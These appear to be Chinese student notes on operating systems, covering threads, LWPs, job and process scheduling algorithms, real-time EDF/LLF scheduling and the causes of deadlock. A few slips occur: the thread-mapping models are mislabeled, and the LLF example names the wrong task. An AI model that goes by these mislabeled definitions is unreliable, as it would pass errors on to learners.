一个进程是一个可拥有资源的独立单位，一个进程要能独立运行，必须拥有一定资源，包括用于存放程序正文、数据的磁盘和内存地址空间，以及它在运行时所需要的I/O设备、已打开文件、信号量等。 进程也是一个可独立分派和调度的基本单位。进程是被操作系统调度的实体。 引入线程，作为调度和分派的基本单元。 线程：轻型进程（Light-Weight Process）/进程元 进程：重型进程（Heavy-Weight Process） 在引入线程后，通常一个进程都拥有若干各线程，至少也有一个线程。 对比1： 线程的切换只涉及指令的切换 进程的切换涉及到映射表的切换。映射表代表着进程的内存空间映像。 对比2： 当线程并发执行。接收一段数据，切换到显示文本，再切换回接收数据。 当线程共用进程的同一个内存地址空间，线程切换时资源不会切换。 对比3： 进程体现出两个特点： 资源（代码和数据空间、打开的文件等） 调度执行 线程是进程内的独立执行代码的实体和调度单元，也能是能独立运行的基本单位。 访问全局变量： ①将内存单元中的数据读入寄存器 ②对寄存器中的值进行运算 ③将寄存器中的值写回内存单元 2.7.2 对比进程和线程的对比 调度的基本单位 在传统的操作系统中，进程作为拥有资源和独立调度、分派的基本单位。而在引入线程的操作系统中，则把线程作为调度和分派的基本单位，而进程作为资源拥有的基本单位。 在同一进程中，线程的切换不会引起进程的切换；但从一个进程中的线程切换到另一个进程中的线程时，必然会引起进程的切换。 并发性：在引入线程的操作系统中，不仅进程之间可以并发执行，而且在一个进程中的多个线程之间亦可并发执行。 引入线程的操作系统中，可以在一个文件服务进程中设置多个服务线程。当第一个线程等待时，文件服务进程中的第二个线程可以继续运行，以提供文件服务；当第二个线程阻塞时，则可由第三个继续执行，提供服务。 拥有资源 一般而言，线程自己不拥有系统资源（也有一点必不可少的资源：TCB、局部变量等)，但它可以访问其隶属进程的资源，即一个进程的代码段、数据段及所拥有的系统资源，如已打开的文件、I/O 设备等，可以供该进程中的所有线程所共享。 独立性 同一进程中的不同线程共享进程的内存空间和资源 同一进程中的不同线程的独立性低于不同进程 系统开销 进程切换、创建、撤销，所需的开销代价远高于线程的切换。 线程之间的同步和通信也比进程简单。由于一个进程中的多个线程具有相同的地址空间。 在一些操作系统中，线程的切换、同步和通信都无须操作系统内核的干预。 支持多处理机系统(SMP(Symmetrical Multi-Processing)) 一个进程分为多个线程，分配到多个处理机上并行执行，可加速进程的完成。 例题 下面关于线程的叙述中，正确的是（ C ）。 **A.**不论是系统支持线程还是用户级线程，其切换都需要内核的支持。 **B.**线程是资源的分配单位，进程是调度和分配的单位。 **C.**不管系统中是否有线程，进程都是拥有资源的独立单位。 **D.**在引入线程的系统中，进程仍是资源分配和调度分派的基本单位。 2.7.3 线程的属性 轻型实体 独立调度和分派的基本单位 可并发执行 共享进程资源 注意：多线程OS中，进程已经是不可执行的实体。 2.7.4 线程的状态同进程一样，线程之间也存在共享资源、相互合作的制约关系，致使线程在运行时也具有间断性。 线程运行的三种状态： 执行状态：表示线程正获得CPU而运行 就绪状态：表示线程已具备了各种运行条件，一旦获得CPU便可以执行。 阻塞状态：表示线程在运行中因为某事件而受阻，处于暂停执行状态。 线程中的挂起操作与进程中的挂起操作是否为同一概念？为什么？ 答：不一样。线程只有CPU资源，不会申请如I/O设备这样的的其他资源，所以挂起线程就是剥夺它的CPU,使其进入阻塞状态。 2.7.5 线程控制块TCB 组成： 线程标识符（唯一） 一组寄存器 ：包括程序计数器、状态寄存器、通用寄存器的内容。 线程运行状态：用于描述线程正处于何种运行状态。 优先级：描述线程执行的优先程度 线程专有存储器 信号屏蔽：对某些信号加以屏蔽 两个堆栈指针：用户栈、核心栈 2.8 Linux线程2.9 线程的实现2.9.1 线程实现方式 内核支持线程（KST—Kernel Supported Threads） 内核支持线程KST在内核支持下运行，它们的创建、阻塞、撤销、切换等，都是在内核空间内实现的。为了对内核线程进行控制和管理，在内核空间为每一个内核进程设置了一个线程控制块，内核根据该控制块而感知某线程的存在并加以控制，当前大多数OS都支持内核支持线程。 当进程要创建一个线程时，便为新线程分配一个TCB，将有关信息填入TCB，并为之分配必要的资源。新线程便可立即执行。当进程要撤消一个线程时，也应收回线程的TCB和所有资源。 优点： SMP中，内核可以同时调度同一进程的多个线程并行执行。 如果一个进程中的线程被阻塞，内核可以调度该进程中的其他线程占有处理器运行，也可以运行其他进程中的线程。 内核支持线程具有很小的数据结构和堆栈，线程的切换比较快，切换开销小。 内核本身可采用多线程技术，可以提高系统并发执行速度和效率。 缺点：对于用户的线程切换而言，其切换模式开销较大，在同一个进程中，从一个线程切换到另一个线程时，需要用户从用户态转到核心态进行，这是因为用户进程的线程在用户态运行，而线程的调度和管理在内核实现，系统开销较大。 用户级线程ULT（User Level Threads） 在用户空间内实现。对线程的创建、撤销、同步与通信等功能，都无需内核支持，即用户线程与内核无关。在一个系统中的用户级线程数目可以达到数百、数千个。由于这些线程的任务控制块都是设置在用户空间，而线程所执行的工作也无需内核帮助，因而内核完全不知道用户级线程的存在。 对于设置了ULT的系统，其调度仍以进程为单位进行。 优点： 线程切换不需要转换到内核空间。节省了模式切换开销。 调度算法可以是进程专用的。在不干扰OS调度的情况下，不同的进程可以根据自身需要选择不同的调度算法，对自己的线程进行管理和调度，而与线程的低级调度算法无关。 用户线程实现与OS平台无关，因为对于线程的管理代码是属于用户程序的一部分，所有应用程序都可以对之进行共享。因此，用户级线程甚至可以在不支持线程机制的操作系统平台上实现。 缺点： 系统调用阻塞问题。在基于进程的OS中，大多数系统调用将使进程阻塞，因此，当线程执行一个系统调用时，不仅该线程被阻塞，而且进程内的所有线程会被阻塞。而在KST方式中，则进程中的其他线程仍然可以运行。 在单纯的用户级线程实现方式中，多线程应用不能利用SMP进行多重处理的优点，内核每次分配给一个进程仅有的一个CPU，因此，进程中仅有一个线程能执行，在该线程放弃CPU前，其他线程只能等待。 组合方式（KST/ULT）：内核支持线程的创建、调度、管理；允许用户应用程序创建、调度、管理用户级线程。在同一进程内的多个线程可以同时在多处理器上并行执行，而且阻塞一个线程时并不需要将整个进程阻塞。 三种不同的模型： 多对一：将一个用户线程映射到一个内核控制线程。 一对多：将每一个用户级线程映射到一个内核支持线程。 多对多：将多个用户线程映射到相同数量/更少数量的内核线程上。 2.9.2 线程的实现核心：上下文切换 KST ULT 在“Runtime system”中的所有函数都驻留在用户空间，并作为用户级线程与内核之间的接口。 无论在传统OS还是在多线程OS中，系统资源都是由内核管理的。 每一个LWP一直捆绑在一个内核级线程上 用LWP实现用户级线程和内核级线程的捆绑 线程库（用户级）可以控制LWP、并完成捆绑 LWP实现了内核与用户级线程之间的隔离，从而使用户级线程与内核无关 多个用户级线程多路复用一个LWP，只有当前连接到LWP上的线程才能与内核通信，其余线程或阻塞，或等待LWP。 在一个系统中，用户级线程的数量可能很大，为节省系统开销不可能设置太多的LWP，而把这些LWP做成一个缓冲池，用户进程中的任一线程都可连接到LWP池的任一LWP上。 每个LWP都要连接到一个内核支持线程上，由此，LWP把用户级线程与内核支持线程连接起来，用户级线程便可访问内核。 采用线程的优点： 在一个已有进程中创建一个新线程比创建一个全新进程所需的时间少。 终止一个线程比终止一个进程花费的时间少。 线程间切换比进程间切换花费的时间少。 线程提高了不同的执行程序间通信的效率。同一个进程中的线程共享存储空间和文件，它们无需调用内核就可以互相通信。 第三章 处理机调度与死锁3.1 处理机调度的层次和调度算法的目标 3.2 作业和作业调度 3.3 进程调度 3.4 实时调度 3.5 死锁概述 3.6 预防死锁 3.7 避免死锁 3.8 死锁的检测与解除 3.1 处理机调度的层次和调度算法的目标分配处理机的任务是由处理机调度程序完成。 处理机调度算法是指根据处理机分配策略所规定的处理机分配算法。 由于处理机是最重要的计算机资源，提高处理机的利用率及改善系统性能（吞吐量、响应时间），在很大程度上取决于处理机调度性能的好坏。 3.1.1 处理机调度层次（三级调度） 高级调度（High Level Scheduling） 又称作业调度、长程调度（lon=g-term scheduling），调度对象为作业。主要功能是根据某种算法，决定将外存上处于后备队列中的哪些作业调入内存。它为被调度作业或用户程序创建进程，分配必要的系统资源，并将新创建的进程插入就绪队列，等待短程调度。 作业基本概念。 作业（Job）是一个比程序更为广泛的概念，它不仅包含了通常的程序和数据，而且还应配有一份作业说明书，系统根据该说明书来对程序的运行进行控制。在批处理系统中，是以作业为基本单位从外存调入内存的。 作业步(Job Step)**。通常，在作业运行期间，每个作业都必须经过若干个相对独立，又相互关联的顺序加工步骤才能得到结果，我们把其中的每一个加工步骤**称为一个作业步，各作业步之间存在着相互联系，往往是把上一个作业步的输出作为下一个作业步的输入。一个典型的作业可分为：“编译”工作步，“链接”工作步和“运行”工作步。 作业流。若干个作业进入系统后，被依次存放在外存上，这便形成了输入的作业流；在操作系统的控制下，逐个作业进行处理，于是便形成了处理作业流。 每当作业进入系统时，系统便为每个作业建立一个JCB，根据作业类型将它插入相应的后备队列中。作业调度程序依据一定的调度算法来调度它们，被调度到的作业将会装入内存。在作业运行期间，系统就按照JCB 中的信息对作业进行控制。当一个作业执行结束进入完成状态时，系统负责回收分配给它的资源，撤消它的作业控制块。 批处理系统中，作业进入系统后，先驻留在磁盘上，组织成批处理队列，称为后备队列。长程调度从该队列中选择一个或多个作业，为之创建进程。 高级调度主要用于多道批处理系统，在分时、实时系统中不设置高级调度。因为为了做到及时响应，用户通过键盘输入的命令或数据等都被直接送入内存，因而无需配置上述作业调度机制，但也需有某种接纳控制措施来限制进入系统的用户数目，实时系统类似。 选择多少作业进入内存：作业调度每次要接纳多少个作业进入内存，取决于多道程序度(Degree of Multiprogramming)，即允许多少个作业同时在内存中运行。当内存中同时运行的作业数目太多时，可能会影响到系统的服务质量，比如，使周转时间太长。但如果在内存中同时运行作业的数量太少时，又会导致系统的资源利用率和系统吞吐量太低，因此，多道程序度的确定应根据系统的规模和运行速度等情况做适当的折衷。 选择哪些作业进入内存：取决于高级调度算法 低级调度(Low Level Scheduling) 又称进程调度或短程调度(Short-term Scheduling)，调度对象是：进程（内核级线程）。 低级调度用来决定就绪队列中的哪个进程应获得处理机，然后再由分派程序把处理机分配给该进程的具体操作。 功能： 保存处理机的现场信息。在进程调度进行调度时，首先需要保存当前进程的处理机的现场信息，如程序计数器、多个通用寄存器中的内容等，将它们送入该进程的进程控制块(PCB)中的相应单元。 按某种算法选取进程。低级调度程序按某种算法如优先法、轮转法等，从就绪队列中选取一个进程，把它的状态改为运行状态，并准备把处理机分配给它。 把处理器分配给进程。由分派程序(Dispatcher)把处理器分配给进程。此时需为选中的进程恢复处理机现场，即把选中进程的进程控制块内有关处理机现场的信息装入处理器相应的各个寄存器中，把处理器的控制权交给该进程，让它从取出的断点处开始继续运行。 进程调度是最基本的一种调度，在多道批处理、分时和实时三种OS中，都必须配置。 短程调度运行频率最高。 低级调度分类： 非抢占方式 在采用这种调度方式时，一旦把处理机分配给某进程后，便让该进程一直执行，直至该进程完成或发生某事件而被阻塞时，才再把处理机分配给其他进程，决不允许某进程抢占已经分配出去的处理机。 引起进程调度： ①正在执行的进程执行完毕，或因发生某事件而不能再继续执行； ②执行中的进程因提出I／O请求而暂停执行； ③在进程通信或同步过程中执行了某种原语操作，如P操作（wait操作）、Block原语、 Wakeup原语等。 优点：实现简单，系统开销小，适合批处理任务。 缺点：难以满足实时任务。（硬实时任务） 抢占方式 这种调度方式，允许调度程序根据某种原则，去暂停某个正在执行的进程，将已分配给该进程的处理机重新分配给另一进程。 原则： 优先权原则：通常是对一些重要的和紧急的作业赋予较高的优先权。当这种作业到达时，如果其优先权比正在执行进程的优先权高，便停止正在执行(当前)的进程，将处理机分配给优先权高的新到的进程，使之执行；或者说，允许优先权高的新到进程抢占当前进程的处理机。 短作业优先原则：当新到达的作业(进程)比正在执行的作业(进程)（尚需运行时间）明显的短时，将暂停当前长作业(进程)的执行，将处理机分配给新到的短作业(进程)，使之优先执行；或者说，短作业(进程)可以抢占当前较长作业(进程)的处理机。 时间片原则：各进程按时间片轮流运行，当一个时间片用完后，便停止该进程的执行而重新进行调度。这种原则适用于分时系统、大多数的实时系统，以及要求较高的批处理系统。 中级调度(Medium-term scheduling) 又称中程调度、内存调度，引入中级调度的主要目的是为了提高内存利用率和系统吞吐量。 当内存空间非常紧张时，或处理机找不到一个可执行的就绪进程时，需要选择一个进程（阻塞或就绪状态）换出到外存，释放出内存空间给别的进程使用；当内存空间较充裕时，从外存选择一个挂起状态的进程调度到内存（换入）。 中级调度决定把外存上的哪些具备运行条件的就绪进程，重新调入内存，并修改其状态为就绪状态，挂在就绪队列上等待调度。 实际上是存储器管理的对换功能。 补充：可用于作业调度 下面的图很重要！！！ 3.1.2 处理机调度算法的目标和准则引言：在一个操作系统的设计中，应如何选择调度方式和算法，在很大程度上取决于操作系统的类型及其目标。例如，在批处理系统、分时系统和实时系统中，通常都采用不同的调度方式和算法。选择调度方式和算法的准则，有的是面向用户的，有的是面向系统的。 处理机调度算法的共同目标 资源利用率。为提高系统的资源利用率，应使系统中的处理机和其他所有资源都尽可能地保持忙碌。 计算CPU利用率： CPU利用率 = CPU有效工作时间/（CPU有效工作时间+CPU空闲等待时间） 公平性。应使诸进程都获得合理的CPU时间，不会发生饥饿时间。公平是相对的，对于相同类型的进程应获得相同的服务；但对于不同类型的进程，由于其紧急程度/重要性不同，则应提供不同的服务。 平衡性。由于在系统中可能具有多种类型的进程，为了使系统中的CPU和各种外部设备都能经常处于忙碌状态，调度算法应尽可能保持系统资源使用的平衡性。 策略强制执行。对所制订的策略其中包括安全策略，只要需要，就必须予以准确地执行，即使会造成某些工作的延迟。 批处理系统的目标： 平均周转时间短。 所谓周转时间，是指作业从被提交给系统开始，到作业完成为止的这段时间间隔（作业周转时间） 周转时间T包括四部分： 作业在外存后备队列上的等待时间 进程在就绪队列上等待进程调度的时间 进程在CPU上执行的时间 进程等待I/O操作的时间 后三项在一个作业处理过程中可能发生多次。 平均周转时间： 从系统管理者角度出发，平均周转时间越短越好。 带权周转时间：作业的周转时间T / 系统为其提供服务的时间Ts W = T/Ts 系统吞吐量高。 吞吐量：单位时间内系统所完成的作业数，与处理作业的平均长度有关。 单纯为了提高吞吐量，就应尽量选择短作业处理。 处理机利用率高。 处理机利用率：衡量系统性能的重要指标。 单纯为了提高处理机利用率，应尽量选择计算量大的作业进行处理。 分时系统的目标 响应时间快。 响应时间：是从用户通过键盘提交一个请求开始，直至系统首次产生响应为止的时间。 响应时间包括三部分： 从键盘输入的请求信息传送到处理机的时间 处理机对请求信息进行处理的时间 将所形成的响应信息回送到终端显示器的时间 均衡性。指系统响应时间快慢应与用户请求的复杂性相适应。 实时系统的目标 截止时间保证。 截止时间：指某任务必须开始执行的最迟时间，或必须完成的最迟时间。 可预测性。 3.2 作业和作业调度多道批处理系统： 用户提交作业 操作员输入作业，存放在外存，作业存放在后备队列 由作业调度（长程调度）程序调入内存 3.2.1 批处理系统中的作业1.作业和作业步（上面已详细说明） 2.作业控制块（Job Control Block，JCB） JCB包含：作业标识、用户名称、用户账号、作业类型（CPU繁忙型、I/O繁忙型、批量型、终端型）、作业状态、调度信息、资源需求、资源使用情况等。 每当一个作业进入系统时，便由“作业注册”程序为该作业建立一个作业控制块JCB，再根据作业类型，将它放到相应的作业后备队列中，等待调度。调度程序按一定的调度算法来调度它们，被调度的作业将被装入内存。作业运行期间，系统按照JCB中的信息和作业说明书对作业进行控制。当一个作业执行结束进入完成状态，系统负责回收以已分配给它的资源，撤销该作业控制块。 3.作业运行的三个阶段和三种状态作业进入系统到运行结束，通常需要经历：收容、运行、完成，三个阶段。相应的作业有“后备状态”、“运行状态”、“完成状态”。 收容。操作员把用户提交的作业通过某种方式或SPOOLing系统输入到硬盘上，再为该作业建立JCB并把它放入到后备队列中。相应地，此时地作业的状态为“后备状态”。 运行。当作业被调度选中后，便为`它分配必要的资源和建立进程，并将它放入就绪队列。一个作业第一次进入就绪状态，直到它运行结束前，在此期间处于“运行状态”。 完成阶段。当作业完后、或发生异常情况而提前结束时，作业便进入完成阶段，相应的作业状态为“完成状态”。此时系统中的“终止作业”程序将会回收已经分配给该作业的作业控制块和所有资源，并将作业运行结果信息形成输出文件后输出。 3.2.2 作业调度的主要任务作业调度（外存到内存）需要做出以下决定： 接纳多少作业（多道程序度） 接纳哪些作业（调度算法） 3.2.3 FCFS和SJF算法 先来先服务调度算法可用于作业调度，也可以用于进程调度。 当在作业调度中采用该算法时，系统安照作业到到达的先后次序来进行调度。优先考虑在系统中等待时间最长的作业，将他们调入内存、分配资源、创建进程，然后放入就绪队列中。 如果在进程调度中采用FCFS，每次调度从就绪队列中挑选最先到达的进程分配处理机。 FCFS很少作为主调度算法，经常与其他调度算法结合使用，形成一种更为有效的调度算法。 FCFS算法比较有利于长作业（进程），而不利于短作业（进程）。 短作业优先调度算法（SJF） 短作业(进程)优先调度算法SJ(P)F，是指对短作业或短进程优先调度的算法。 短作业优先(SJF)的调度算法是从后备队列中选择一个或若干个估计运行时间最短的作业，将它们调入内存运行。 短进程优先(SPF)调度算法是从就绪队列中选出一个估计运行时间最短的进程，将处理机分配给它，使它立即执行并一直执行到完成，或发生某事件而被阻塞放弃处理机时再重新调度。 短作业优先调度算法的缺点： 该算法对长作业不利。 该算法完全未考虑作业的紧迫程度，因而不能保证紧迫性作业（进程）会被及时处理。 由于作业（进程）的长短只是根据用户所提供的估计执行时间而定的，而用户又可能会估计不准运行时间，致使该算法不一定能真正做到短作业优先调度。 3.2.4 优先级调度算法和高响应比优先调度算法优先级调度算法(priority-scheduling algorithm,PSA) 实际应用中，作业的性质可能是不同，运行的迫切性也有所不同。因此，可以为每个作业定义一个优先级，优先级越高的作业将优先获得调度从后备队列进入内存就绪队列之中。 当应用于作业调度时，优先级调度算法是把具有最高优先级的作业调入内存之中。 当应用于进程调度时，优先级调度算法是调度就绪队列中具有最高优先级的进程获得处理机。 高响应比优先调度算法(Highest Response Ratio Next,HRRN) 引入动态优先级，随等待时间延长而增加。 响应比Rp = （等待时间+要求服务时间）/要求服务时间 ​ = 1 + 等待时间/要求服务时间 ​ = 响应时间/要求服务时间 如果作业的等待时间相同，则要求服务的时间愈短，其优先权愈高，因而该算法有利于短作业。当要求服务的时间相同时，作业的优先权决定于其等待时间，等待时间愈长，其优先权愈高，因而它实现的是先来先服务。对于长作业，作业的优先级可以随等待时间的增加而提高，当其等待时间足够长时，其优先级便可升到很高，从而也可获得处理机。简言之，该算法既照顾了短作业，又考虑了作业到达的先后次序，不会使长作业长期得不到服务。因此，该算法实现了一种较好的折衷。当然，在利用该算法时，每要进行调度之前，都须先做响应比的计算，这会增加系统开销。 3.3 进程调度 进程调度的任务： 保存处理机现场 按照某种算法选取进程 把处理机分配给进程 进程调度机制 排队器。为提高进程调度的效率，应事先将系统中的所有就绪进程按照一定策略排成一个或多个队列，以便调度程序能最快找到它。以后每当有一个进程变为就绪状态时，排队器就将它插入到相应的就绪队列。 分派器。分派器依据进程调度程序所选的进程，将其从就绪队列中取出，然后进行从分派器到新选出进程间的上下文切换，将处理机分配给新选出的进程。 上下文切换器。在对处理机进行切换时，会发生两对上下文切换操作。 第一对上下文切换时，OS将保存当前进程的上下文，即把当前进程的处理机寄存器内容保存到该进程的PCB的相应单元，再装入分派程序的上下文，以便分派程序运行。 第二对上下文切换是移出分派程序的上下文，而把新选进程的CPU现场信息装入到处理机各个相应的寄存器中，以便新进程运行。 进行上下文切换时，需要执行大量的load和store等操作指令，以保存寄存器的内容。 进程调度方式1.非抢占方式(Nonpreemptive Mode)在这种方式下，系统一旦把处理机分配给就绪队列中优先权最高的进程后，该进程便一直执行下去，直至完成；或因发生某事件使该进程放弃处理机时，系统方可再将处理机重新分配给另一优先权最高的进程。不能用于分时系统和实时系统。 2.抢占方式(Preeptive Mode)在这种方式下，系统同样是把处理机分配给优先权最高的进程，使之执行。但在其执行期间，只要又出现了另一个其优先权更高的进程，进程调度程序就立即停止当前进程的执行，重新将处理机分配给新到的优先权最高的进程。抢占的原则：优先权原则、短进程优先原则、时间片原则 3.3.2 轮转调度算法(Round Robin,RR) 在时间片轮转法中，系统将所有的就绪进程按先来先服务FCFS的原则，排成一个队列，每次调度时，把CPU分配给队首进程。并令其执行一个时间片。 当执行的时间片用完时，由一个计时器发出时钟中断请求，调度程序便据此信号来停止该进程的执行，若程序尚未运行完毕，将它送往就绪队列的末尾；然后，再把处理机分配给就绪队列中新的队首进程（或新到达的紧迫进程），同时也让它执行一个时间片。 这样就可以保证就绪队列中的所有进程，在一给定的时间内，均能获得一时间片的处理机执行时间，换言之，系统能在给定的时间内，响应所有用户的请求。 进程切换时机： 若一个时间片尚未用完，正在运行的进程便已经完成，就立即激活调度程序，将它从就绪队列删除，再调度就绪队列中队首进程运行，并启动一个新的时间片。 在一个时间片用完时，计时器中断处理程序被激活。如果进程尚未运行完毕，调度程序将它送往就绪队列的末尾。 进程切换将会增加系统的额外开销。 时间片设定得太短，进程切换会非常频繁，从而降低处理机的效率；时间片设定得太长，将无法满足交互式用户对响应时间的要求。 因此，时间片大小的确定应综合考虑系统的最大用户数、响应时间、系统效率等多种因素。 例题： 上图有错！！！ 为了简单，图中忽略了进程切换时的系统开销，而实际操作系统中，这类额外开销是客观存在的。 采用基于时间片轮转调度法，进程的周转时间和平均周转时间并不比采用FCFS和短进程优先调度算法小。 加上进程切换所需的系统开销时间，该算法的平均周转时间还会增长。 常用于分时系统及事务处理系统，合理的时间片大小将带来满意的响应时间。 通常，合理的时间片指，能让**80%**左右的进程在一个时间片内完成。 对于短的、计算型的进程较有利。 不适合于批处理系统的进程调度。 不利于I/O型的进程。 改进的方法之一，可以将I/O阻塞事件完成的进程单独组织一个就绪队列，该队列进程的时间片可以设置的小一些，且优先调度 短作业优先算法平均周转时间最小 3.3.3 优先级调度算法优先调度算法类型非抢占式优先级调度算法抢占式优先级调度算法 优先级的类型优先级调度算法的关键：应该如何确定进程的优先级。 静态优先级 静态优先级是在创建进程时确定的，在进程整个运行期间保持不变。 优先级利用某一范围内的一个整数表示，例如0~255中的某一个整数，把该整数称为优先数。 确定进程优先级的依据： 进程类型。系统进程的优先权高于一般用户进程的优先权。 进程对资源的需求。对要求少的进程应赋予较高的优先权。 用户要求。根据进程的紧迫程度以及用户所付费用的多少确定优先级。 动态优先级 动态优先级： 动态优先级是指，在创建进程时所赋予的优先权，是可以随进程的推进或随其等待时间的增加而改变的，以便获得更好的调度性能。 例如，可以规定在就绪队列中的进程随其等待时间增长，使其优先级相应提升。若所有进程具有相同的优先级初始值，则最先进入就绪队列的进程会因其优先级变得最高，而优先获得处理机，这相当于FCFS算法。若所有的就绪进程具有各自不同的优先级初值，那么对于优先级初值低的进程，在等待了足够时间后，也可以得到处理机。当采用抢占式调度方式时，若再规定当前进程的优先级随时间的推移而下降，则可以防止一个长作业长期地垄断处理机。 3.3.4 多队列调度算法 将进程的就绪队列拆分为多个 不同类型或性质的进程固定分配在对应的就绪队列 不同的就绪队列采用不同的调度算法 进程可以有不同的优先级、队列也可以有不同的优先级 一个就绪队列中的进程可以设置不同的优先级，不同的就绪队列本身也可以设置不同的优先级。 3.3.5 多级反馈队列调度算法(multileved feedback queue)应设置多个就绪队列，并为各个队列赋予不同的优先级。 第一个最高，以后依次降低。 当一个新进程进入内存后，首先将它放入第一队列的末尾，按FCFS原则排队等待调度。 ①当轮到该进程执行时，如它能在该时间片内完成，便可准备撤离系统； ②如果它在一个时间片结束时尚未完成，调度程序便将该进程转入第二队列的末尾，再同样地按FCFS原则等待调度执行； ③如果它在第二队列中运行一个时间片后仍未完成，再依次将它放入第三队列，……。 仅当第一队列空闲时，调度程序才调度第二队列中的进程运行。 多级反馈队列调度算法具有较好的性能，能较好地满足各种类型用户的需要。 终端型用户。由终端型用户提交的作业多属于交互型作业，通常较小，系统要使作业能在第一队列所规定的时间片内完成，可使终端型作业用户都感到满意。 短批处理作业用户。对该用户更有利，周转时间较短。 长批处理作业用户。对于长作业，它将依次在第1，2,…，n个队列中运行，然后再按轮转方式运行，用户不必担心其作业长期得不到处理。 小结 如何选择进程调度算法与系统设计的目标有关。 交互式多任务系统，主要考虑联机用户对响应时间的要求，一般采用基于时间片轮转调度算法，同时，根据进程的性质设置不同的优先级。 批处理系统往往以进程（或作业）的平均周转时间来衡量调度性能，常选用基于优先级的短进程（或作业）优先调度算法。 3.4 实时调度由于在实时系统中都存在着若干个实时进程或任务，它们用来反应或控制某个外部事件，往往带有某种程度的紧迫性，因而对实时系统中的调度提出了某些特殊要求，前面所介绍的多种调度算法，并不能很好地满足实时系统对调度的要求，为此，需要引入一种新的调度，即实时调度。 3.4.1 实现实时调度的基本条件提供必要的信息 就绪时间。这是该任务成为就绪状态的起始时间，在周期任务的情况下，它就是事先预知的一串时间序列；而在非周期任务的情况下，它也可能是预知的。 开始截止时间和完成截止时间。对于典型的实时应用，只须知道开始截止时间，或者知道完成截止时间。 处理时间。这是指一个任务从开始执行直至完成所需的时间。在某些情况下，该时间也是系统提供的。 资源要求。这是指任务执行时所需的一组资源。 优先级。如果某任务的开始截止时间已经错过，就会引起故障，则应为该任务赋予“绝对”优先级；如果开始截止时间的推迟对任务的继续运行无重大影响，则可为该任务赋予“相对”优先级，供调度程序参考。 系统处理能力强在实时系统中，通常都有着多个实时任务。若处理机的处理能力不够强，则有可能因处理机忙不过来而使某些实时任务不能得到及时处理。 解决方法： 仍是采用单处理机系统，但须增强其处理能力，以显著地减少对每一个任务的处理时间。 采用多处理机系统。 采用抢占式调度机制在含有硬实时任务的实时系统中，广泛采用抢占机制。当一个优先权更高的任务到达时，允许将当前任务暂时挂起，而令高优先权任务立即投入运行，这样便可满足该硬实时任务对截止时间的要求。 具有快速切换机制为保证要求较高的硬实时任务能及时运行，在实时系统中还应具有快速切换机制，以保证能进行任务的快速切换。该机制应具有如下两方面的能力： 对外部中断的快速响应能力。为使在紧迫的外部事件请求中断时系统能及时响应，要求系统具有快速硬件中断机构，还应使禁止中断的时间间隔尽量短，以免耽误时机(其它紧迫任务)。 快速的任务分派能力。在完成任务调度后，便应进行任务切换。为了提高分派程序进行任务切换时的速度，应使系统中的每个运行功能单位适当地小，以减少任务切换的时间开销。 3.4.2 实时调度算法分类根据实时任务性质，可将实时调度算法分为： 硬实时调度算法 软实时调度算法 根据调度方式分类： 抢占式调度算法 非抢占式调度算法 非抢占式调度算法 非抢占式轮转调度算法 调度程序每次选择队列中的第一个任务投入运行。当该任务完成后，便把它挂在轮转队列的末尾，等待下次调度运行。该算法可获得数秒到数十秒的响应时间，可用于要求不太严格的实时控制系统。 非抢占式优先调度算法 如果在系统中存在着实时要求较为严格的任务，则可采用非抢占式优先调度算法，为这些任务赋予较高的优先级。当这些实时任务到达时，把它们安排在就绪队列的队首，等待当前任务自我终止或运行完成后，才能被调度执行。 抢占式调度算法 基于时钟中断的抢占式优先权调度算法 某实时任务到达后，如果该任务的优先级高于当前任务的优先级，这时并不立即抢占当前任务的处理机，而是等到时钟中断到来时，调度程序才剥夺当前任务的执行，将处理机分配给新到的高优先权任务。 立即抢占的优先权调度算法 一旦出现外部中断，只要当前任务未处于临界区，便能立即剥夺当前任务的执行，把处理机分配给请求中断的紧迫任务。 3.4.3 常用的几种实时调度算法最早截止时间优先(Earliest Deadline First)EDF该算法要求在系统中保持一个实时任务就绪队列，该队列按各任务截止时间的早晚排序；具有最早截止时间的任务排在队列的最前面。调度程序总是选择就绪队列中的第一个任务，为之分配处理机，使之投入运行。 EDF算法用于非抢占式调度方式 四个非周期任务，现后达到 抢占式调度方式用于周期实时任务 最低松弛度优先(Least Laxity First)松弛度 = 必须完成时间 - 本身运行时间 - 当前时间 该算法按松弛度排序实时任务的就绪队列，松弛度值最小的任务排在队列最前面，调度程序总是选择就绪队列中的队首任务执行。 在刚开始时(t1 = 0)，A1必须在20 ms 时完成，而它本身运行又需 10 ms，可算出A1的松弛度为10 ms；B1必须在50 ms 时完成，而它本身运行就需25 ms，可算出B1的松弛度为25 ms，故调度程序应先调度A1执行。 在t2 = 10 ms 时，A2的松弛度可按下式算出：A2的松弛度 = 必须完成时间 - 其本身的运行时间 - 当前时间 = 40 ms-10 ms-10 ms = 20 ms 类似地，可算出B1的松弛度为15 ms，故调度程序应选择B2运行。 在t3 = 30 ms 时，A2的松弛度已减为0(即40 - 10 - 30)，而B1的松弛度为15 ms(即50 - 5 - 30)，于是调度程序应抢占B1的处理机而调度A2运行。 。在t 4 = 40 ms时，A3的松弛度为10 ms(即60 - 10 - 40)，而B1的松弛度仅为5 ms(即50 - 5 - 40)，故又应重新调度B1执行。 在t5 = 45 ms 时，B1执行完成，而此时A3 的松弛度已减为5 ms(即60 - 10 - 45)，而B2 的松弛度为30 ms(即100 - 25 - 45)，于是又应调度A3执行。 在t6 = 55 ms 时，任务A 尚未进入第4 周期，而任务B 已进入第2 周期，故再调度B2执行。 在t7 = 70 ms 时，A4的松弛度已减至0 ms(即80 - 10 - 70)，而B2的松弛度为20 ms(即100 - 10 - 70)，故此时调度又应抢占B2的处理机而调度A4 执行。 注意： 当等待任务的松弛度值为0时才进行抢占（如20ms时虽然A2的松弛度比B1的松弛度小，但A2并没有抢占B1）。 当有任务执行时，只有等待任务的松弛度值为0才会发生任务的调度，其他情况不发生调度。 任务执行结束后或无任务执行时，再比较等待任务的松弛度值，较小的先执行。 3.5 产生死锁的原因和条件所谓死锁（Deadlock），是指多个进程在运行过程中因争夺资源而造成的一种僵局（Deadly- Embrace），当进程处于这种僵持状态时，若无外力作用，它们都将无法再向前推进。 3.5.1 资源问题 可重用性资源 每一个可重用资源中的单元只能分配给一个进程使用，不允许多个进程共享 进程在使用该类资源过程中，须按照下列顺序：请求，使用，释放 系统中每一类可重用资源中的单元数目是相对固定的，进程在运行期间既不能创建也不能删除它 可消耗性资源 临时性资源，其在进程运行期间，由进程动态地创建和消耗的 每一类可消耗性资源的单元数目在运行期间是不断变化的 进程在运行过程中，可以不断地创造可消耗性资源的单元 进程在运行过程中，可以请求若干个可消耗性资源单元 